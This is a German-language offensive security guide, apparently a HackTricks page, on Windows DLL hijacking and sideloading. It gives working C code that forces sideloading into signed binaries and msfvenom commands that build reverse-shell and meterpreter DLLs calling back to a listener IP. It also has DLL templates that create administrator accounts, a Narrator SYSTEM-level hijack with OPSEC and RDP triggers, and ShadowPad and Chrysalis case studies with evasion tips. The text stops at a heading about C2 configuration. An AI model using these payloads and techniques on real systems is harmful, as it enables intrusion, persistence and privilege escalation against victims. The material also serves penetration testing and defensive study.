# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Er wird hauptsächlich für Codeausführung, zum Erreichen von Persistence und seltener für Privilegieneskalation genutzt. Obwohl hier der Fokus auf Eskalation liegt, bleibt die Methode des Hijackings unabhängig vom Ziel gleich.

### Häufige Techniken

Mehrere Methoden werden für DLL Hijacking verwendet, deren Effektivität vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Austauschen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die ursprüngliche Funktionalität zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad, der vor dem legitimen liegt, und Ausnutzen des Suchmusters der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung zu laden versucht, weil sie denkt, dass eine erforderliche DLL nicht existiert.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu lenken.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Version im WinSxS-Verzeichnis — eine Methode, die oft mit DLL side-loading in Verbindung steht.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich zu Binary Proxy Execution-Techniken.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implantate über DLL sideloading schichtet, siehe den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende Dlls finden

Die häufigste Methode, um fehlende Dlls in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn du nach **fehlenden dlls im Allgemeinen** suchst, lässt du das für einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden dll in einer bestimmten ausführbaren Datei** suchst, solltest du **einen weiteren Filter wie "Process Name" "contains" `<exec name>` setzen, sie ausführen und das Erfassen der Ereignisse stoppen**.

## Ausnutzen fehlender Dlls

Um Privilegien zu eskalieren, ist die beste Chance, eine **DLL zu schreiben, die ein privilegierter Prozess zu laden versucht**, in einem der Orte, an denen sie gesucht wird. Daher können wir entweder eine DLL in einem **Ordner schreiben, der vor dem Ordner, in dem die originale DLL liegt, durchsucht wird** (seltsamer Fall), oder wir schreiben in einen **Ordner, in dem die DLL gesucht wird**, während die originale **DLL in keinem Ordner vorhanden ist**.

### Dll Search Order

**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du, wie die Dlls konkret geladen werden.**

**Windows-Anwendungen** suchen DLLs, indem sie einer Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge folgen. Das Problem des DLL Hijackings entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der echten DLL geladen wird. Eine Lösung, um dies zu verhindern, ist sicherzustellen, dass die Anwendung absolute Paths verwendet, wenn sie auf benötigte DLLs verweist.

Du siehst die **DLL search order on 32-bit** Systemen unten:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, rückt das aktuelle Verzeichnis auf Platz zwei vor. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (Standard ist aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine dll durch Angabe des absoluten Pfads und nicht nur des Namens geladen werden kann**. In diesem Fall wird diese dll **nur in diesem Pfad gesucht** (falls die dll Abhängigkeiten hat, werden diese so gesucht, als wären sie nur nach Name geladen worden).

Es gibt weitere Wege, die Suchreihenfolge zu verändern, die ich hier nicht erklären werde.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, um die DLL-Suchpfade eines neu erstellten Prozesses deterministisch zu beeinflussen, ist das Setzen des DllPath-Feldes in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen APIs von ntdll. Indem man hier ein vom Angreifer kontrolliertes Verzeichnis angibt, kann ein Zielprozess, der eine importierte DLL nach Name auflöst (kein absoluter Pfad und ohne die sicheren Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Baue die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein Dropper/Unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Ziel-Binary eine DLL nach Name auflöst, wird der Loader diesen bereitgestellten DllPath während der Auflösung konsultieren, was zuverlässiges sideloading ermöglicht, selbst wenn die bösartige DLL nicht zusammen mit der Ziel-EXE liegt.

Anmerkungen/Einschränkungen
- Dies betrifft den erzeugten Kindprozess; es ist anders als SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL nach Name importieren oder mit LoadLibrary laden (kein absoluter Pfad und nicht unter Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartcodierte absolute Pfade können nicht hijacked werden. Forwarded exports und SxS können die Priorität verändern.

Minimaler C-Beispiel (ntdll, wide strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von DLL sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Beispiel zur praktischen Verwendung
- Platziere eine bösartige xmllite.dll (die die benötigten Funktionen exportiert oder an die echte weiterleitet) in deinem DllPath-Verzeichnis.
- Starte ein signiertes Binary, von dem bekannt ist, dass es xmllite.dll per Name sucht und die obige Technik verwendet. Der Loader löst den Import über das angegebene DllPath auf und sideloads deine DLL.

Diese Technik wurde in-the-wild beobachtet, um mehrstufige sideloading-Ketten anzutreiben: ein anfänglicher Launcher legt eine Hilfs-DLL ab, die dann ein von Microsoft signiertes, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.


#### Ausnahmen bei der DLL-Suchreihenfolge in der Windows-Dokumentation

Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge sind in der Windows-Dokumentation vermerkt:

- Wenn eine **DLL gefunden wird, die denselben Namen wie eine bereits im Speicher geladene DLL teilt**, umgeht das System die übliche Suche. Stattdessen prüft es auf Umleitung und ein Manifest, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- Falls die DLL als **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der known DLL sowie alle abhängigen DLLs und **verzichtet auf den Suchprozess**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Sollte eine **DLL Abhängigkeiten haben**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **Modulnamen** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal or lateral movement), dem **eine DLL fehlt**.
- Stelle sicher, dass für jedes **Verzeichnis**, in dem nach der **DLL** gesucht wird, **Schreibzugriff** besteht. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind kompliziert zu finden, da **es standardmäßig eher ungewöhnlich ist, ein privilegiertes Executable zu finden, dem eine DLL fehlt**, und es noch **ungewöhnlicher ist, Schreibrechte in einem Systempfad-Ordner zu haben** (standardmäßig hat man diese nicht). In fehlkonfigurierten Umgebungen ist das jedoch möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das Projekt [UACME](https://github.com/hfiref0x/UACME) anschauen. Auch wenn das **Hauptziel des Projekts das Umgehen von UAC ist**, findest du dort möglicherweise einen **PoC** für ein Dll hijaking für die Windows-Version, den du verwenden kannst (wahrscheinlich reicht es, den Pfad des Ordners zu ändern, in dem du Schreibrechte hast).

Beachte, dass du deine **Berechtigungen in einem Ordner** überprüfen kannst, indem du folgendes ausführst:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die permissions aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die imports einer executable und die exports einer dll damit überprüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking ausnutzt, um Privilegien zu eskalieren**, wenn Schreibrechte in einem **System Path-Ordner** vorhanden sind, siehe:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) prüft, ob Sie Schreibberechtigungen für einen Ordner innerhalb des System PATH haben.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Example

Falls Sie ein ausnutzbares Szenario finden, ist eine der wichtigsten Voraussetzungen für einen erfolgreichen Exploit, eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importiert. Beachten Sie außerdem, dass Dll Hijacking nützlich sein kann, um [von Medium Integrity level auf High zu eskalieren **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine gültige dll erstellt**, finden Sie in dieser dll hijacking-Studie mit Fokus auf Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem finden Sie im **nächsten Abschnitt** einige **einfache dll-Codes**, die als **Vorlagen** nützlich sein können oder um eine **dll mit nicht benötigten exportierten Funktionen** zu erstellen.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Grundsätzlich ist ein **Dll proxy** eine dll, die in der Lage ist, **deinen bösartigen Code beim Laden auszuführen**, aber auch die Schnittstellen zu **exponieren** und wie **erwartet zu funktionieren**, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die du proxifizieren möchtest, und **eine proxified dll generieren**, oder **die dll angeben** und **eine proxified dll generieren**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) bekommen:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren muss**, die vom victim process geladen werden. Wenn diese Funktionen nicht existieren, wird die **binary sie nicht laden können** und der **exploit fehlschlagen wird**.

<details>
<summary>C DLL Vorlage (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL, die für arbitrary code execution und persistence hijacked werden kann.

Wichtige Fakten
- Prüfpfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn eine beschreibbare, vom Angreifer kontrollierte DLL am OneCore-Pfad existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine Exports erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Starten Sie Narrator und beobachten Sie den versuchten Ladevorgang des oben genannten Pfads.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Schwachstellendetails

- **Komponente**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit-Implementierung

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer `hostfxr.dll` nach `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Warten, bis der geplante Task um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn ein Administrator zum Zeitpunkt der Ausführung angemeldet ist, läuft die bösartige DLL in der Sitzung des Administrators mit medium integrity.
4. Standardmäßige UAC bypass techniques verketten, um von medium integrity auf SYSTEM-Privilegien zu eskalieren.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Angreifer kombinieren häufig MSI-basierte Dropper mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Kettenüberblick
- Der Benutzer lädt ein MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL-Suchreihenfolge wsc.dll zuerst aus dem Arbeitsverzeichnis und führt Angreifer-Code unter einem signierten Parent aus (ATT&CK T1574.001).

MSI-Analyse (Worauf zu achten ist)
- CustomAction table:
- Achten Sie auf Einträge, die ausführbare Dateien oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- In Orca (Microsoft Orca.exe) die CustomAction-, InstallExecuteSequence- und Binary-Tabellen prüfen.
- Eingebettete/aufgeteilte payloads in der MSI CAB:
- Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oder lessmsi verwenden: lessmsi x package.msi C:\out
- Achten Sie auf mehrere kleine Fragmente, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Häufiger Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Lege diese beiden Dateien in denselben Ordner:
- wsc_proxy.exe: legitimate signed host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
- wsc.dll: attacker DLL. Falls keine speziellen exports benötigt werden, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten exports an die genuine library weiter, während du den payload in DllMain ausführst.
- Erstelle einen minimalen DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Exportanforderungen verwenden Sie ein Proxy-Framework (z. B. DLLirant/Spartacus), um eine forwarding DLL zu erzeugen, die außerdem Ihr Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binärdatei. Wenn der Host absolute Pfade oder sichere Load-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann das Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binärdatei und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mit einer **drei-Dateien-Triade** verteilt, um sich in legitime Software einzufügen und das Kern-Payload auf der Festplatte verschlüsselt zu halten:

1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei so um, dass sie wie ein Windows-Binary aussieht (z. B. `conhost.exe`), die Authenticode-Signatur bleibt jedoch gültig.
2. **Malicious loader DLL** – neben der EXE abgelegt mit dem erwarteten Namen (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise ein MFC-Binary, das mit dem ScatterBrain-Framework obfuskiert wurde; ihre einzige Aufgabe ist, das verschlüsselte Blob zu finden, zu entschlüsseln und ShadowPad reflectively zu mappen.
3. **Encrypted payload blob** – oft als `<name>.tmp` im selben Verzeichnis abgelegt. Nachdem das entschlüsselte Payload in den Speicher gemappt wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu vernichten.

Tradecraft notes:

* Durch das Umbenennen der signierten EXE (während der ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) kann sie als Windows-Binary auftreten und trotzdem die Vendor-Signatur behalten. Replizieren Sie Ink Dragon’s Vorgehen, `conhost.exe`-ähnliche Binaries abzulegen, die in Wirklichkeit AMD/NVIDIA-Utilities sind.
* Weil die ausführbare Datei vertraut bleibt, müssen die meisten Allowlisting-Kontrollen nur Ihre bösartige DLL neben ihr zulassen. Konzentrieren Sie sich auf die Anpassung der Loader-DLL; das signierte Parent kann typischerweise unverändert ausgeführt werden.
* ShadowPad’s Decryptor erwartet, dass das TMP-Blob neben dem Loader liegt und beschreibbar ist, damit es nach dem Mapping nulliert werden kann. Halten Sie das Verzeichnis bis zum Laden des Payloads beschreibbar; sobald das Payload im Speicher ist, kann die TMP-Datei aus OPSEC-Gründen sicher gelöscht werden.

## Fallstudie: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Eine jüngere Lotus Blossom-Intrusion missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper zu liefern, der einen DLL-Sideload sowie vollständig In-Memory-Payloads stufte.

Tradecraft flow
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine bösartige `log.dll` und ein verschlüsseltes Blob `BluetoothService` ab und startet dann die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` mappt das Blob per mmap in den Speicher; `LogWrite` entschlüsselt es mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Key-Material aus einem vorherigen Hash abgeleitet), überschreibt den Buffer mit Plaintext-Shellcode, gibt temporäre Ressourcen frei und springt dorthin.
- Um ein IAT zu vermeiden, löst der Loader APIs durch Hashing von Exportnamen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, wendet dann eine Murmur-ähnliche Avalanche (**0x85EBCA6B**) an und vergleicht gegen gesalzene Ziel-Hashes.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem add/XOR/sub mit dem Key `gQ2JR&9;` über fünf Durchgänge wiederholt wird, lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung zu beenden.
- Rekonstruiert DLL-Namenstrings zur Laufzeit über pro-Zeichen Bit-Rotate/XOR-Transformationen und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Nutzt einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-ähnlichem Mixing parst und nur auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
